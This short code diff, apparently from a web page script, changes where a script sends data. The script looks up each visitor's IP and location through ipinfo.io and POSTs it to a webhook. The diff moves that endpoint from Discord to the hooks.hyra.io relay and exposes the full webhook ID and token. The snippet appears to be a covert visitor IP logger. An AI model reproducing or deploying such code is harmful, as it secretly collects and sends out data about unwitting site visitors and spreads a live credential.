@@ -37,7 +37,7 @@ $.getJSON('https://ipinfo.io/json', function(data) {
         "attachments": []
       }
       var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1088490117666177034/JJITE1tpdu7o2tWRkaqwKydLYS5YVP6YtpkWgQ86GVTAQB46jgXxQe5eieETzAp_-12s");
+      request.open("POST", "https://hooks.hyra.io/api/webhooks/1088490117666177034/JJITE1tpdu7o2tWRkaqwKydLYS5YVP6YtpkWgQ86GVTAQB46jgXxQe5eieETzAp_-12s");
 
       request.setRequestHeader('Content-type', 'application/json');
 
